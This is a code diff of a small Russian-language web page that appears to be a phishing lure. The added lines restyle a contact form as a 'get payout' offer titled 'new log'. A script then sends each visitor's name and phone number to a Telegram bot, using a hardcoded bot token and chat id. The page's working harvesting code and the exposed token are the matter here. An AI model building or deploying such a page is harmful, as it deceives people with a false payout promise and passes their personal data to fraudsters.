@@ -1,74 +1,82 @@
-<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
-
+<!DOCTYPE html>
 <html>
-
 <head>
+  <meta charset="UTF-8">
+  <title>Новый лог👻</title>
 
-<meta charset="UTF-8">
+  <style>
+    body {
+      font-family: Arial;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-  <title>Мой сайт</title>
+    .box {
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 12px;
+      width: 300px;
+    }
 
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #3b82f6;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #2563eb;
+    }
+  </style>
 </head>
 
 <body>
 
+<div class="box">
+  <h2>Оставь заявку</h2>
 
-<h2>Оставь заявку</h2>
+  <input type="text" id="name" placeholder="Имя">
+  <input type="text" id="phone" placeholder="Телефон">
 
-
-<input type="text" id="name" placeholder="Имя"><br><br>
-
-<input type="text" id="phone" placeholder="Телефон"><br><br>
-
-
-<button onclick="send()">Отправить</button>
-
+  <button onclick="send()">Получить виплату</button>
+</div>
 
 <script>
-
 function send() {
-
   const name = document.getElementById("name").value;
-
   const phone = document.getElementById("phone").value;
 
-
   const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
+  const chat_id = "8589160707";
 
-  const chat_id = "8035773808";
-
-
-  const text = "Новая заявка:\nИмя: " + name + "\nТелефон: " + phone;
-
-
-  fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
-
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
-
-    headers: {
-
-      "Content-Type": "application/json"
-
-    },
-
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-
       chat_id: chat_id,
-
-      text: text
-
+      text: `🔥 Новый лог👻:\nИмя: ${name}\nТелефон: ${phone}`
     })
-
   });
 
-
   alert("Отправлено!");
-
 }
-
 </script>
 
-
 </body>
-
 </html>
